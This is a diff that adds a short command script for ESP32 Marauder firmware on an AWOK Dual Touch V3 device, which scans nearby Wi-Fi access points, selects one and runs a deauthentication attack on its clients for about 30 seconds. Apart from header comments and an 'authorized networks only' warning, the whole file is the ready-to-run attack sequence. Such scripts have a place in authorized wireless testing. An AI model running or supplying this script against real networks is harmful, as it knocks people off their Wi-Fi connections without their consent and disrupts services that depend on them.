@@ -1,0 +1,17 @@
+# deauth_selected_ap -- deauthenticate clients of a selected access point
+# Target: AWOK Dual Touch V3, orange (CLI) port, esp32_marauder_dev_board_pro.bin, v1.13.0
+# Flow: scan APs -> print list -> select AP index 0 -> attack -t deauth (targets selected AP)
+# EDIT: change `select -a 0` to the AP index shown by `list -a`.
+# Duration: ~55 s.  SD: not required.  GPS: not required.
+# ACTIVE ATTACK -- authorized networks only.
+
+stopscan
+clearlist -a
+scanap
+DELAY 25000
+stopscan
+list -a
+select -a 0
+attack -t deauth
+DELAY 30000
+stopscan
